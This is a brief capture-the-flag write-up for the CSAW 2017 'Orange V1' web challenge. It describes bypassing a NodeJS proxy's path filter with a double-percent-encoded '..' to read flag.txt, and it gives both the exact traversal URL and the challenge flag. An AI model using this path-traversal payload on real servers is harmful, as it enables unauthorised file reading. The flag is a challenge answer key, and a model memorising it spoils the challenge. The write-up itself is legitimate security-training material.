# CSAW17
## Orange V1 - WEB
http://web.chal.csaw.io:7311/?path=orange.txt
I wrote a little proxy program in NodeJS for my poems folder.

Everyone wants to read flag.txt but I like it too much to share.
Write up available here : [techoverflow.fr](http://techoverflow.fr/2017/09/18/orange-v1-web-csaw17/)

## Solution
Double enconding the ".." using http://2tap.com/javascript-percent-encoder/

http://web.chal.csaw.io:7311/?path=%25%32%65%25%32%65/flag.txt

## Flag

flag{ch3ck-exp3rian-dat3-b3for3-us3}
